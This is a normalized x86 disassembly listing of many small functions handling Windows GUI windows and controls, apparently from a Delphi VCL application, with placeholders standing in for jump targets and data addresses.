sub_43fbb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43d81c
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43b4f4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_43fbb0
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_43fc60
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_43fbb0
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4514e0
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43b4f4
test eax eax
jne r-xdata
sub_43fd08
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fd28
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fd5c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_43e7a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43fd7c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_43fdcc
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_43fdf0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_439618
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_43d858
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_43d81c
mov dl [ esp ]
mov si 0xffd1
call sub_403300
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_43fe48
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403300
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43fe6c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403300
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_43fea4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43bfc8
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_43d8b8
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_43e0c8
sub_43fedc
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403300
pop esi
pop ebx
retn
mov eax ebx
call sub_43a984
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404314
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404314
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_43ff5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e4a8
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43c09c
sub_43ffbc
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_43e21c
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_43d618
pop ebx
retn
sub_43ffec
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_440014
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_43d618
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_440084
push ebx
mov ebx eax
mov eax ebx
call sub_43bf08
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_43d8b8
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41cc3c
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43b4f4
sub_4400c0
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_438bf8
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_440b28
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43b4f4
sub_440100
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_440e2c
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_440b28
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_440140
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_43d8b8
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_440a30
sub_440180
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_440c68
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_440c68
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_4401e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43af50
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_439e90
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_43e414
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_440250
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c040
mov edx esi
mov eax ebx
call sub_43d878
pop esi
pop ebx
retn
sub_44026c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_437234
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4514e0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403300
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403300
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403300
test al al
jne r-xdata
sub_440300
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_441be0
mov edx esi
mov eax ebx
call sub_44026c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43b4f4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43b4f4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43b4f4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4514e0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43b4f4
test eax eax
jne r-xdata
jmp r-xdata
sub_4403e4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43b4f4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_440438
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43b4f4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4514e0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43b4f4
test eax eax
jne r-xdata
sub_440484
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44026c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43b4f4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4514e0
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43b4f4
test eax eax
jne r-xdata
sub_4404e0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4514e0
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43b4f4
mov [ esi + 0xc ] eax
sub_440514
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_440e2c
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_440e2c
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4399a0
mov eax ebx
mov si 0xffd0
call sub_403300
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_439cec
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4405ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_43d858
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_43d81c
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403300
inc edi
dec ebx
jne r-xdata
sub_440634
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d3c0
xor eax eax
push ebp
push sub_4406d2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4405ec
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_439f68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4406d9
mov eax [ ebp - 0x4 ]
call sub_43d3c8
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4406e0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_43d3e8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_43d81c
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403290
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4407d0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413dc8
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413c5c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413de8
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413d6c
call sub_440b28
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413d6c
call sub_440b28
sub_4408a8
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4407d0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_440908
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_440b28
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_440b28
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b5dc
call sub_403890
test eax eax
jne r-xdata
sub_44096c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440e2c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43b4f4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42f358
call sub_42f438
test al al
je r-xdata
mov eax ebx
call sub_43d858
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_43d81c
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_43d81c
test [ eax + 0x52 ] 0x4
je r-xdata
sub_440a30
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_439cec
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_440a68
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_4514e0
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_440aa8
push ebx
mov ebx eax
mov eax ebx
call sub_4514e0
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_45524c
pop ebx
retn
mov eax ebx
call sub_451508
mov eax ebx
call sub_440b28
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_440ae0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_440b04
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_440b04
sub_440b3c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_412938
mov eax edi
call sub_43d858
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_43d81c
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_440bd0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_440b28
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_440c08
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_440e2c
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_440b28
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_403300
sub_440cc4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413dc8
pop esi
pop ebx
retn
sub_440ce8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_440cc4
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
cmp eax edi
je r-xdata
mov esi edx
dec esi
mov edx ebp
xchg edx eax
call sub_413c5c
mov edx edi
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x194 ]
mov ecx ebx
call sub_413de8
sub_440d5c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x1a4 ]
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x1a4 ] bl
mov eax esi
call sub_440e2c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb028
mov eax esi
call sub_43b4f4
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
and eax 0xfffeffff
test bl bl
je r-xdata
push eax
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call SetWindowLongA
or eax 0x10000
sub_440dbc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_440e20
push [ fs : eax ]
mov [ fs : eax ] esp
cmp dl [ ebx + 0x1a7 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440e27
lea eax [ ebp - 0x4 ]
call sub_4054f4
retn
mov [ ebx + 0x1a7 ] dl
test [ ebx + 0x1c ] 0x10
setne al
xor al 0x1
test al dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
mov si 0xffc6
call sub_403300
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x17c ]
call sub_40550c
sub_440e38
push ebx
push esi
push edi
add esp 0xffffffc4
mov ebx eax
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
je r-xdata
push esp
mov eax [ ebx + 0x180 ]
push eax
call GetWindowRect
mov [ esp + 0x10 ] 0x2c
lea eax [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea esi [ esp + 0x2c ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
